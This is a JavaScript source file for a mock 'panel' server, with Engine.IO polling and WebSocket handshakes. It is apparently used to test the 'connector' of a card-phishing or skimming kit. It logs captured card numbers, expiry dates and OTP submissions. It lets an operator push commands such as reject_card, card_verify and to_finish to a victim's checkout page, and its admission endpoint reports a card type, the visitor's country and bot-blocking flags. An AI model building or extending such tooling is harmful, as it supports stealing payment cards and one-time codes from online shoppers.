/**
 * 最小 mock 面板（Engine.IO v4 polling 传输，零依赖）
 *
 * 目的：不接真面板也能验证官方 connector 的守卫链路
 *   点提交 → e12/e14 save_card → 挂起 → 面板回 r6 to_finish
 *          → connector POST /api/checkout → 跳 /order/<单号>
 *
 * 端点：
 *   GET/POST /socket.io/                    Engine.IO polling + socket.io 事件
 *   POST     /api/UserEnvironmentDetection  准入（返回 logname/pagetype）
 *   GET      /mock/state                    看会话、收到的事件
 *   GET      /mock/send/r6                  手动让前端提交
 *   GET      /mock/send/r1                  拒卡
 *   GET      /mock/auto?on=1&delay=500      开关「收到 e14 自动回 r6」
 */
import http from 'node:http';
import crypto from 'node:crypto';

const PORT = Number(process.env.MOCK_PORT || 3100);
const state = {
  sid: 'mock-' + Math.random().toString(36).slice(2, 10),
  events: [],          // 收到的所有事件 [{t, name, payload}]
  queue: [],           // 待发给浏览器的帧
  waiters: [],         // 挂起的 GET
  auto: true,
  autoDelay: 600,
  connected: false,
};

function push(frame) {
  const w = state.waiters.shift();
  if (w) { w(frame); return; }
  state.queue.push(frame);
}

function parseBody(raw) {
  // Engine.IO polling 的 body 可能是多帧用 \x1e 分隔
  return String(raw || '').split('\x1e').filter(Boolean);
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const p = url.pathname;
  const cors = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
    'Access-Control-Allow-Credentials': 'false',
  };
  if (req.method === 'OPTIONS') { res.writeHead(204, cors); return res.end(); }

  // ── Engine.IO / socket.io ──
  if (p === '/socket.io/') {
    const eio = url.searchParams.get('EIO') || '4';
    const transport = url.searchParams.get('transport') || 'polling';

    if (transport !== 'polling') {
      res.writeHead(400, cors); return res.end('mock only supports polling');
    }

    if (req.method === 'GET') {
      // 首次握手
      if (!state.connected) {
        state.connected = true;
        const hs = `0${JSON.stringify({ sid: state.sid, upgrades: [], pingInterval: 25000, pingTimeout: 20000, maxPayload: 1000000 })}`;
        res.writeHead(200, { ...cors, 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end(hs);
      }
      // 后续 GET：有排队帧立即回，否则挂起等
      if (state.queue.length) {
        const data = state.queue.join('\x1e');
        state.queue = [];
        res.writeHead(200, { ...cors, 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end(data);
      }
      const done = (frame) => {
        res.writeHead(200, { ...cors, 'Content-Type': 'text/plain; charset=utf-8' });
        res.end(frame);
      };
      state.waiters.push(done);
      setTimeout(() => {
        const i = state.waiters.indexOf(done);
        if (i >= 0) { state.waiters.splice(i, 1); try { done('2'); } catch {} }
      }, 15000);
      return;
    }

    if (req.method === 'POST') {
      const chunks = [];
      for await (const c of req) chunks.push(c);
      const raw = Buffer.concat(chunks).toString('utf8');
      state.posts = (state.posts || 0) + 1;
      state.lastRaw = raw.slice(0, 300);
      const frames = parseBody(raw);
      console.log(`[mock] POST#${state.posts} raw=${JSON.stringify(raw.slice(0, 120))}`);
      for (const f of frames) {
        if (f === '40' || f.startsWith('40')) { push(`40${JSON.stringify({ sid: state.sid })}`); continue; }
        if (f === '3' || f === '2') continue;         // pong / ping
        if (f.startsWith('42')) {
          let arr;
          try { arr = JSON.parse(f.slice(2)); } catch { continue; }
          const name = arr[0];
          const payload = arr[1];
          state.events.push({ t: Date.now(), name, payload });
          console.log(`[mock] ${name}`, typeof payload === 'object'
            ? JSON.stringify(payload).slice(0, 160)
            : String(payload).slice(0, 80));

          // 收到 save_card(e14) → 延迟回 r6 to_finish（模拟操作员点「完成」）
          if (state.auto && /save_card|e14/.test(name)) {
            setTimeout(() => {
              console.log('[mock] → r6 to_finish');
              push(`42${JSON.stringify(['r6', { action: 'to_finish' }])}`);
            }, state.autoDelay);
          }
          // 验证码提交
          if (state.auto && /submit_otp|e10/.test(name)) {
            setTimeout(() => {
              console.log('[mock] → r6 to_finish (after otp)');
              push(`42${JSON.stringify(['r6', { action: 'to_finish' }])}`);
            }, 300);
          }
        }
      }
      res.writeHead(200, { ...cors, 'Content-Type': 'text/plain' });
      return res.end('ok');
    }
  }

  // ── 准入接口 ──
  if (p === '/api/UserEnvironmentDetection') {
    const chunks = [];
    for await (const c of req) chunks.push(c);
    res.writeHead(200, { ...cors, 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify({
      status: 'success',
      data: {
        logname: 'WordPress',
        logtype: 'cc',
        pagetype: '1',
        user_ip: '127.0.0.1',
        user_country: 'TW',
        block_pc: false, block_mobile: false, block_bot: false,
      },
    }));
  }

  // ── 控制面 ──
  if (p === '/mock/state') {
    res.writeHead(200, { ...cors, 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      connected: state.connected,
      auto: state.auto,
      eventNames: state.events.map((e) => e.name),
      cardEvents: state.events.filter((e) => /submit_card|save_card/.test(e.name)).map((e) => ({
        name: e.name,
        cardn: (e.payload && (e.payload.cardn || e.payload.card_number)) || '',
        exp: (e.payload && (e.payload.Expiry || e.payload.card_expiry)) || '',
      })),
      lastSaveCard: (state.events.filter((e) => /save_card|e14/.test(e.name)).pop() || {}).payload || null,
    }, null, 1));
  }
  if (p.startsWith('/mock/send/')) {
    const cmd = p.split('/mock/send/')[1];
    const map = { r6: 'to_finish', r1: 'reject_card', r3: 'reject_verify', r2: 'card_verify' };
    push(`42${JSON.stringify([cmd, { action: map[cmd] || cmd, html: url.searchParams.get('html') || '' }])}`);
    res.writeHead(200, { ...cors, 'Content-Type': 'text/plain' });
    return res.end('sent ' + cmd);
  }
  if (p === '/mock/auto') {
    state.auto = url.searchParams.get('on') !== '0';
    state.autoDelay = Number(url.searchParams.get('delay') || 600);
    res.writeHead(200, { ...cors, 'Content-Type': 'text/plain' });
    return res.end(`auto=${state.auto} delay=${state.autoDelay}`);
  }

  res.writeHead(404, cors);
  res.end('mock panel: unknown ' + p);
});

server.listen(PORT, '127.0.0.1', () => {
  console.log(`mock panel → http://127.0.0.1:${PORT}`);
  console.log(`  socket : ws://127.0.0.1:${PORT}/socket.io/  (websocket + polling)`);
  console.log(`  verify : POST /api/UserEnvironmentDetection`);
  console.log(`  state  : GET  /mock/state`);
});

/* ============================================================================
 * 最小 WebSocket 服务端（socket.io-client 默认先试 websocket，必须有）
 * ==========================================================================*/
const WS_GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';

function wsEncode(str) {
  const payload = Buffer.from(str, 'utf8');
  const len = payload.length;
  let header;
  if (len < 126) {
    header = Buffer.from([0x81, len]);
  } else if (len < 65536) {
    header = Buffer.alloc(4);
    header[0] = 0x81; header[1] = 126; header.writeUInt16BE(len, 2);
  } else {
    header = Buffer.alloc(10);
    header[0] = 0x81; header[1] = 127; header.writeBigUInt64BE(BigInt(len), 2);
  }
  return Buffer.concat([header, payload]);
}

function wsDecodeFrames(buf, onFrame) {
  let off = 0;
  while (off + 2 <= buf.length) {
    const b0 = buf[off];
    const b1 = buf[off + 1];
    const opcode = b0 & 0x0f;
    const masked = (b1 & 0x80) !== 0;
    let len = b1 & 0x7f;
    let p = off + 2;
    if (len === 126) { len = buf.readUInt16BE(p); p += 2; }
    else if (len === 127) { len = Number(buf.readBigUInt64BE(p)); p += 8; }
    const mask = masked ? buf.subarray(p, p + 4) : null;
    if (masked) p += 4;
    if (p + len > buf.length) break;
    let payload = Buffer.from(buf.subarray(p, p + len));
    if (mask) for (let i = 0; i < payload.length; i++) payload[i] ^= mask[i & 3];
    onFrame(opcode, payload.toString('utf8'));
    off = p + len;
  }
  return off;
}

function handleSocketFrame(sock, text) {
  if (text === '40' || text.startsWith('40')) { sock.send(`40${JSON.stringify({ sid: state.sid })}`); return; }
  if (text === '2') { sock.send('3'); return; }
  if (text === '3') return;
  if (!text.startsWith('42')) return;
  let arr;
  try { arr = JSON.parse(text.slice(2)); } catch { return; }
  const name = arr[0];
  const payload = arr[1];
  state.events.push({ t: Date.now(), name, payload });
  console.log(`[mock] WS ${name}`, typeof payload === 'object' ? JSON.stringify(payload).slice(0, 140) : String(payload).slice(0, 80));
  if (state.auto && /save_card|e14/.test(name)) {
    setTimeout(() => { console.log('[mock] → r6 to_finish'); sock.send(`42${JSON.stringify(['r6', { action: 'to_finish' }])}`); }, state.autoDelay);
  }
  if (state.auto && /submit_otp|e10/.test(name)) {
    setTimeout(() => { console.log('[mock] → r6 to_finish (otp)'); sock.send(`42${JSON.stringify(['r6', { action: 'to_finish' }])}`); }, 300);
  }
}

server.on('upgrade', (req, socket) => {
  const key = req.headers['sec-websocket-key'];
  if (!key) { socket.destroy(); return; }
  const accept = crypto.createHash('sha1').update(key + WS_GUID).digest('base64');
  socket.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    `Sec-WebSocket-Accept: ${accept}\r\n\r\n`
  );
  state.connected = true;
  state.ws = true;
  console.log('[mock] websocket 已连接');

  // Engine.IO 先发 open 包
  socket.write(wsEncode(`0${JSON.stringify({ sid: state.sid, upgrades: [], pingInterval: 25000, pingTimeout: 20000, maxPayload: 1000000 })}`));

  const sock = { send: (t) => { try { socket.write(wsEncode(t)); } catch {} } };
  state.wsSend = sock.send;

  let pending = Buffer.alloc(0);
  socket.on('data', (chunk) => {
    pending = Buffer.concat([pending, chunk]);
    pending = pending.subarray(wsDecodeFrames(pending, (op, text) => {
      if (op === 8) { try { socket.end(); } catch {} return; }
      if (op === 9) { return; }
      handleSocketFrame(sock, text);
    }));
  });
  socket.on('error', () => {});
  socket.on('close', () => { state.connected = false; state.ws = false; console.log('[mock] websocket 断开'); });
});

